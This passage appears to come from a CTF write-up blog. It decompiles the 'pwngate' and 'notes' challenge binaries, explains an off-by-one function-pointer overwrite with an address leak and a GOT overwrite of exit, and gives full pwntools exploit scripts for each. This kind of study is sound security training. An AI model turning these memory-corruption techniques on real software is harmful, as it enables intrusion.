<h5 id="sanity-func"><a href="#sanity-func" class="headerlink" title="sanity func"></a>sanity func</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">sanity</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> iVar1;</span><br><span class="line">  undefined4 local_ed;</span><br><span class="line">  undefined local_e9;</span><br><span class="line">  <span class="type">char</span> local_e8 [<span class="number">50</span>];</span><br><span class="line">  <span class="type">char</span> local_b6 [<span class="number">50</span>];</span><br><span class="line">  <span class="type">char</span> local_84 [<span class="number">50</span>];</span><br><span class="line">  <span class="type">char</span> local_52 [<span class="number">54</span>];</span><br><span class="line">  <span class="type">int</span> local_1c;</span><br><span class="line">  <span class="type">int</span> i;</span><br><span class="line">  <span class="type">int</span> local_14;</span><br><span class="line">  <span class="type">int</span> local_10;</span><br><span class="line">  uint local_c;</span><br><span class="line">  </span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;\nI don\&#x27;t recognize you, answer some questions first.&quot;</span>);</span><br><span class="line">  sleep(<span class="number">1</span>);</span><br><span class="line">  local_c = <span class="number">0</span>;</span><br><span class="line">  local_10 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span>( <span class="literal">true</span> ) &#123;</span><br><span class="line">    <span class="keyword">while</span>( <span class="literal">true</span> ) &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;------------------------------&quot;</span>);</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;[1] Answer my questions&quot;</span>);</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;[2] Show your answers&quot;</span>);</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;[3] See your score&quot;</span>);</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;[4] Return&quot;</span>);</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;------------------------------&quot;</span>);</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;Choose: &quot;</span>);</span><br><span class="line">      local_ed = <span class="number">0</span>;</span><br><span class="line">      local_e9 = <span class="number">0</span>;</span><br><span class="line">      fgets((<span class="type">char</span> *)&amp;local_ed,<span class="number">5</span>,<span class="built_in">stdin</span>);</span><br><span class="line">      local_1c = atoi((<span class="type">char</span> *)&amp;local_ed);</span><br><span class="line">      <span class="keyword">if</span> (local_1c != <span class="number">1</span>) <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">for</span> (local_14 = <span class="number">0</span>; local_14 &lt; <span class="number">2</span>; local_14 = local_14 + <span class="number">1</span>) &#123;</span><br><span class="line">        <span class="built_in">memset</span>(local_e8 + (<span class="type">long</span>)local_14 * <span class="number">0x32</span>,<span class="number">0</span>,<span class="number">0x32</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;What is written on the Lab Members badge?&quot;</span>);</span><br><span class="line">      fgets(local_e8,<span class="number">0x32</span>,<span class="built_in">stdin</span>);</span><br><span class="line">      iVar1 = <span class="built_in">strcmp</span>(local_e8,<span class="string">&quot;OSHMKUFA 2010&quot;</span>);</span><br><span class="line">      <span class="keyword">if</span> (iVar1 != <span class="number">0</span>) &#123;</span><br><span class="line">        local_c = local_c + <span class="number">1</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;What is the name of Okabe\&#x27;s Laboratory?&quot;</span>);</span><br><span class="line">      fgets(local_b6,<span class="number">0x32</span>,<span class="built_in">stdin</span>);</span><br><span class="line">      iVar1 = <span class="built_in">strcmp</span>(local_b6,<span class="string">&quot;Future Gagdet Laboratory&quot;</span>);</span><br><span class="line">      <span class="keyword">if</span> (iVar1 != <span class="number">0</span>) &#123;</span><br><span class="line">        local_c = local_c + <span class="number">1</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;What is Mayuri\&#x27;s favorite hobby?&quot;</span>);</span><br><span class="line">      fgets(local_84,<span class="number">0x32</span>,<span class="built_in">stdin</span>);</span><br><span class="line">      iVar1 = <span class="built_in">strcmp</span>(local_84,<span class="string">&quot;Cosplay&quot;</span>);</span><br><span class="line">      <span class="keyword">if</span> (iVar1 != <span class="number">0</span>) &#123;</span><br><span class="line">        local_c = local_c + <span class="number">1</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Is Ruka a boy or girl?&quot;</span>);</span><br><span class="line">      fgets(local_52,<span class="number">0x32</span>,<span class="built_in">stdin</span>);</span><br><span class="line">      iVar1 = <span class="built_in">strcmp</span>(local_52,<span class="string">&quot;It depends on the timeline&quot;</span>);</span><br><span class="line">      <span class="keyword">if</span> (iVar1 != <span class="number">0</span>) &#123;</span><br><span class="line">        local_c = local_c + <span class="number">1</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      leveling._4_4_ = <span class="number">1</span>;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;I think l remember you a bit now...&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ((local_1c == <span class="number">2</span>) &amp;&amp; (local_10 != <span class="number">1</span>)) <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">if</span> (local_1c == <span class="number">3</span>) &#123;</span><br><span class="line">      local_10 = <span class="number">1</span>;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;Your score is: %d \n&quot;</span>,(ulong)local_c);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="keyword">if</span> ((local_1c != <span class="number">2</span>) || (local_10 != <span class="number">1</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;These are your answers: &quot;</span>);</span><br><span class="line">      <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i = i + <span class="number">1</span>) &#123;</span><br><span class="line">        <span class="built_in">puts</span>(local_e8 + (<span class="type">long</span>)i * <span class="number">0x32</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;You didn\&#x27;t even start the game...&quot;</span>);</span><br><span class="line">                    <span class="comment">/* WARNING: Subroutine does not return */</span></span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>okay simple quiz game. Users answer questions, accumulating a score for incorrect responses. They can choose to answer, display answers, or check their score. Incorrect answers increase the score. The function handles input, checks answers, and provides feedback.</p>
<p>this function require <code>leveling._0_4_ != 0</code> BTW </p>
<h5 id="okabe-func"><a href="#okabe-func" class="headerlink" title="okabe func"></a>okabe func</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">okabe</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> iVar1;</span><br><span class="line">  <span class="type">char</span> local_28 [<span class="number">12</span>];</span><br><span class="line">  undefined local_1c;</span><br><span class="line">  </span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;What\&#x27;s the password?&quot;</span>);</span><br><span class="line">  fgets(local_28,<span class="number">20</span>,<span class="built_in">stdin</span>);</span><br><span class="line">  local_1c = <span class="number">0</span>;</span><br><span class="line">  iVar1 = <span class="built_in">strcmp</span>(leveling + <span class="number">8</span>,local_28);</span><br><span class="line">  <span class="keyword">if</span> (iVar1 != <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;That\&#x27;s wrong.&quot;</span>);</span><br><span class="line">                    <span class="comment">/* WARNING: Subroutine does not return */</span></span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Do you still remember who you are?: &quot;</span>);</span><br><span class="line">  fgets(timeline,<span class="number">0x20</span>,<span class="built_in">stdin</span>);</span><br><span class="line">  <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Prompts the user to enter a password using <code>fgets</code> and stores it in the <code>local_28</code> character array check for password correction, if incorrect exit the program or else it will prompt the user to enter data that being stored on <strong>timeline</strong> variable </p>
<p>and remember it require <code>leveling._4_4_ != 0</code> to being called </p>
<p><strong>okkayy lets sum up the information we got</strong> :</p>
<ul>
<li>we have BOF in function <code>divergence_meter</code> that allows us to to write out of bound <ul>
<li>but things get start serious when we jump to while loop where the content of local variable <code>local_2f</code> being copied into timeline variable, it loop for 9 time and content of local_2f variable being copied to timeline one by one, as index of timeline start from 16 that is <code>timeline[(long)local_1c + 16]</code> and goes until 9 byte of write (<code>if(8&lt;local_1c)</code>) we are able to write next one byte of <code>timeline</code> i.e. <code>timeline[24]</code> and as we have seen in <code>curretn_leap</code> function this particular member of this structure is function pointer of fate function i.e. <code>timeline._24_8_ = fate;</code> so we have OBO bug here</li>
</ul>
</li>
<li>function <code>timeleap</code> call the function i.e. <code>(*timeline._24_8_)();</code></li>
<li>yet to see how function <code>sanity</code> is working or if it gives any information that can help us to pwn the binary as it is only callable if <code>leveling._0_4_ != 0</code> we have to figure it out</li>
<li>function <code>okabe</code> asking for password that we don’t know about so far and this func is only callable when <code>leveling._4_4_ != 0</code> as previous function</li>
</ul>
<p>so lets focus on <code>sanity</code> and <code>okabe</code> function for now how we can make it call.</p>
<p>okay as <code>leveling._4_4_</code> is global we can follow or cross reference where else this particular variable being used in program by double clicking on it (in ghidra)</p>
<p><img src="/imgs/post6/pwn/pwngate2.1.png" alt="pwngate2.1.png"></p>
<p>so its used in some other function also where one of them is <code>print_current_password</code> where we can see <code>leveling._0_4_ = 1</code> so this function make that particular variable value 1, so somehow we have to call this function to call <code>sanity</code> one </p>
<p>lets follow the parent function function of this particular one following XREF </p>
<p><img src="/imgs/post6/pwn/pwngate3.gif" alt="pwngate3.gif"></p>
<p>so <code>print_current_password -&gt; verify_number -&gt; whereami -&gt; new_fate</code> we have to call <code>new_fate</code> one </p>
<p>and same for <code>okabe</code></p>
<p><img src="/imgs/post6/pwn/pwngate4.gif" alt="pwngate4.gif"></p>
<p>the function we have to to call is <code>sanity</code> , we have to call <code>sanity</code> anyway </p>
<p>we leveraged the OBO bug to overwrite the LSB of one byte of <code>fate</code> address <code>new_fate</code> that gives us password</p>
<p><img src="/imgs/post6/pwn/pwngate5.png" alt="pwngate5.png"></p>
<p>and thus we are allowed to call <code>sanity</code> that leaks the address (see the exploit)</p>
<p><img src="/imgs/post6/pwn/pwngate6.png" alt="pwngate6.png"></p>
<p><img src="/imgs/post6/pwn/pwngate7.png" alt="pwngate7.png"></p>
<p><strong>Exploitation methodology</strong> :</p>
<ul>
<li>using OBO overwrite the <code>fate</code> to <code>new_fate</code> as the first byte and a half is not changed by aslr so we can hardcode the byte</li>
<li>call the <code>timeleap</code> function so that we can make <code>new_fate</code> call undirectly using function pointer</li>
<li>grab the password from <code>new_fate</code> </li>
<li>grab the leak from <code>sanity</code> and calculate the base </li>
<li>use the pass and overwrite the address of <code>timeline._24_8_</code> with <code>win</code> i.e. first 24 byte garbage and rest 8 byte address of <code>win</code> as we are allowed to write 32 byte </li>
<li>as we have overwritten <code>timeline._24_8_</code> we can call it using <code>timeleap</code> function</li>
</ul>
<h4 id="Exploit-3"><a href="#Exploit-3" class="headerlink" title="Exploit"></a>Exploit</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&quot;./pwngate_patched&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;./libc.so.6&quot;</span>)</span><br><span class="line">ld = ELF(<span class="string">&quot;./ld-2.35.so&quot;</span>)</span><br><span class="line"></span><br><span class="line">context.binary = elf</span><br><span class="line"></span><br><span class="line">gdbscript=<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">continue</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">conn</span>(<span class="params">argv=[], *a, **kw</span>):</span><br><span class="line">    <span class="keyword">if</span> args.GDB:  <span class="comment"># Set GDBscript below</span></span><br><span class="line">        <span class="keyword">return</span> gdb.debug([elf.path] + argv, gdbscript=gdbscript, *a, **kw)</span><br><span class="line">    <span class="keyword">elif</span> args.REMOTE:  <span class="comment"># (&#x27;server&#x27;, &#x27;port&#x27;)</span></span><br><span class="line">        <span class="keyword">return</span> remote(sys.argv[<span class="number">1</span>], sys.argv[<span class="number">2</span>], *a, **kw)</span><br><span class="line">    <span class="keyword">else</span>:  <span class="comment"># Run locally</span></span><br><span class="line">        <span class="keyword">return</span> process([elf.path] + argv, *a, **kw)</span><br><span class="line"></span><br><span class="line">r = conn()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">obo_fate</span>(<span class="params">obo</span>):</span><br><span class="line">    r.sendlineafter(<span class="string">&quot;Enter choice: &quot;</span>, <span class="string">&quot;1&quot;</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">&quot;Choose where to leap: &quot;</span>, <span class="string">b&quot;A&quot;</span>*<span class="number">8</span> + pack(obo)) </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">answer_questions</span>():</span><br><span class="line">    r.sendlineafter(<span class="string">&quot;Choose: &quot;</span>, <span class="string">&quot;1&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">        r.recvline()</span><br><span class="line">        r.sendline(<span class="string">&quot;M&quot;</span>*(<span class="number">0x30</span> - <span class="number">1</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    </span><br><span class="line">    r.sendlineafter(<span class="string">&quot;Enter your name: &quot;</span>, <span class="string">&quot;zr0x&quot;</span>)</span><br><span class="line">    obo_fate(<span class="number">0xec</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">&quot;Enter choice: &quot;</span>, <span class="string">&quot;2&quot;</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">&quot;Choose what to do: &quot;</span>, <span class="built_in">str</span>(<span class="number">0x100000000</span>))</span><br><span class="line">    r.recvuntil(<span class="string">&quot;Your password is: \n&quot;</span>)</span><br><span class="line">    password = r.recvline().strip()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">b&quot;PASS is &quot;</span> + password)</span><br><span class="line">     </span><br><span class="line">    r.sendlineafter(<span class="string">&quot;Enter choice: &quot;</span>, <span class="string">&quot;3&quot;</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">&quot;Choose: &quot;</span>, <span class="string">&quot;3&quot;</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">&quot;Choose: &quot;</span>, <span class="string">&quot;2&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    r.recvline()</span><br><span class="line">    leak = u64(r.recvline().strip().ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">    log.info(<span class="string">&quot;Leak &quot;</span> + <span class="built_in">hex</span>(leak))</span><br><span class="line"></span><br><span class="line">    answer_questions()</span><br><span class="line"></span><br><span class="line">    r.sendlineafter(<span class="string">&quot;Choose: &quot;</span>, <span class="string">&quot;4&quot;</span>)</span><br><span class="line">    elf.address = leak - <span class="number">0x3d48</span></span><br><span class="line">    r.sendlineafter(<span class="string">&quot;Enter choice: &quot;</span>, <span class="string">&quot;4&quot;</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">&quot;\n&quot;</span>, password)</span><br><span class="line">    r.sendlineafter(<span class="string">&quot;are?: &quot;</span>, <span class="string">b&quot;A&quot;</span>*<span class="number">0x18</span> + p64(elf.sym.win))</span><br><span class="line">    r.sendlineafter(<span class="string">&quot;Enter choice: &quot;</span>, <span class="string">&quot;2&quot;</span>)</span><br><span class="line"></span><br><span class="line">    r.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>


<h3 id="notes"><a href="#notes" class="headerlink" title="notes"></a>notes</h3><h5 id="main-func-3"><a href="#main-func-3" class="headerlink" title="main func"></a>main func</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  undefined8 uVar1;</span><br><span class="line">  <span class="type">int</span> local_6c;</span><br><span class="line">  undefined local_68 [<span class="number">16</span>];</span><br><span class="line">  undefined local_58 [<span class="number">16</span>];</span><br><span class="line">  undefined local_48 [<span class="number">16</span>];</span><br><span class="line">  undefined local_38 [<span class="number">16</span>];</span><br><span class="line">  undefined local_28 [<span class="number">16</span>];</span><br><span class="line">  <span class="type">int</span> local_10;</span><br><span class="line">  <span class="type">int</span> local_c;</span><br><span class="line">  </span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>,(<span class="type">char</span> *)<span class="number">0x0</span>,<span class="number">2</span>,<span class="number">0</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>,(<span class="type">char</span> *)<span class="number">0x0</span>,<span class="number">2</span>,<span class="number">0</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stderr</span>,(<span class="type">char</span> *)<span class="number">0x0</span>,<span class="number">2</span>,<span class="number">0</span>);</span><br><span class="line">  local_68 = (undefined  [<span class="number">16</span>])<span class="number">0x0</span>;</span><br><span class="line">  local_58 = (undefined  [<span class="number">16</span>])<span class="number">0x0</span>;</span><br><span class="line">  local_48 = (undefined  [<span class="number">16</span>])<span class="number">0x0</span>;</span><br><span class="line">  local_38 = (undefined  [<span class="number">16</span>])<span class="number">0x0</span>;</span><br><span class="line">  local_28 = (undefined  [<span class="number">16</span>])<span class="number">0x0</span>;</span><br><span class="line">  <span class="keyword">while</span>( <span class="literal">true</span> ) &#123;</span><br><span class="line">    <span class="keyword">do</span> &#123;</span><br><span class="line">      <span class="keyword">while</span>( <span class="literal">true</span> ) &#123;</span><br><span class="line">        <span class="keyword">do</span> &#123;</span><br><span class="line">          <span class="keyword">while</span>( <span class="literal">true</span> ) &#123;</span><br><span class="line">            menu();</span><br><span class="line">            __isoc99_scanf(&amp;DAT_0040204f,&amp;local_6c);</span><br><span class="line">            <span class="keyword">if</span> (local_6c != <span class="number">3</span>) <span class="keyword">break</span>;</span><br><span class="line">            view(local_68);</span><br><span class="line">          &#125;</span><br><span class="line">        &#125; <span class="keyword">while</span> (<span class="number">3</span> &lt; local_6c);</span><br><span class="line">        <span class="keyword">if</span> (local_6c != <span class="number">2</span>) <span class="keyword">break</span>;</span><br><span class="line">        local_c = get_index();</span><br><span class="line">        <span class="keyword">if</span> ((local_c != <span class="number">-1</span>) &amp;&amp; (*(<span class="type">long</span> *)(local_68 + (<span class="type">long</span>)local_c * <span class="number">8</span>) != <span class="number">0</span>)) &#123;</span><br><span class="line">          edit(*(undefined8 *)(local_68 + (<span class="type">long</span>)local_c * <span class="number">8</span>));</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125; <span class="keyword">while</span> (<span class="number">2</span> &lt; local_6c);</span><br><span class="line">    <span class="keyword">if</span> (local_6c == <span class="number">0</span>) <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">if</span> ((local_6c == <span class="number">1</span>) &amp;&amp; (local_10 = get_index(), local_10 != <span class="number">-1</span>)) &#123;</span><br><span class="line">      uVar1 = add();</span><br><span class="line">      *(undefined8 *)(local_68 + (<span class="type">long</span>)local_10 * <span class="number">8</span>) = uVar1;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">                    <span class="comment">/* WARNING: Subroutine does not return */</span></span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>work flow of main function :</p>
<ul>
<li>allows us to add , edit , view and exit using their corresponding numbers</li>
<li>takes index and content to add and edit the particular memory section</li>
</ul>
<p>did manage to overwrite got entry of <code>exit</code> with <code>win</code> function as partial relero is set</p>
<h4 id="Exploit-4"><a href="#Exploit-4" class="headerlink" title="Exploit"></a>Exploit</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python3</span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&quot;./notes&quot;</span>)</span><br><span class="line"></span><br><span class="line">context.binary = elf</span><br><span class="line"></span><br><span class="line">gdbscript =<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">break</span> *<span class="number">0x0000000000401439</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">def conn(argv=[], *a, **kw):</span><br><span class="line">    <span class="keyword">if</span> args.GDB:  # Set GDBscript below</span><br><span class="line">        <span class="keyword">return</span> gdb.debug([elf.path] + argv, gdbscript=gdbscript, *a, **kw)</span><br><span class="line">    elif args.REMOTE:  # (<span class="string">&#x27;server&#x27;</span>, <span class="string">&#x27;port&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> remote(sys.argv[<span class="number">1</span>], sys.argv[<span class="number">2</span>], *a, **kw)</span><br><span class="line">    <span class="keyword">else</span>:  # Run locally</span><br><span class="line">        <span class="keyword">return</span> process([elf.path] + argv, *a, **kw)</span><br><span class="line"></span><br><span class="line">r = conn()</span><br><span class="line">def add(index):</span><br><span class="line">    r.recv()</span><br><span class="line">    r.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">    r.recvline()</span><br><span class="line">    r.sendline(str(index))</span><br><span class="line">    r.recvline()</span><br><span class="line">    r.sendline(b<span class="string">&quot;AA&quot;</span>)</span><br><span class="line"></span><br><span class="line">def edit(index, content):</span><br><span class="line">    r.recv()</span><br><span class="line">    r.sendline(<span class="string">&quot;2&quot;</span>)</span><br><span class="line">    r.recvline()</span><br><span class="line">    r.sendline(str(index))</span><br><span class="line">    r.recvline()</span><br><span class="line">    r.sendline(content)</span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    </span><br><span class="line">    add(<span class="number">0</span>)</span><br><span class="line">    add(<span class="number">1</span>)</span><br><span class="line">    pause()</span><br><span class="line">    edit(<span class="number">0</span>, b<span class="string">&quot;A&quot;</span>*<span class="number">0x20</span> + p64(elf.got[<span class="string">&quot;exit&quot;</span>]))</span><br><span class="line">    pause() </span><br><span class="line">    edit(<span class="number">1</span>, p64(elf.sym.win))</span><br><span class="line">    pause()  </span><br><span class="line">    r.sendline(<span class="string">&quot;0&quot;</span>)</span><br><span class="line"></span><br><span class="line">    r.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>


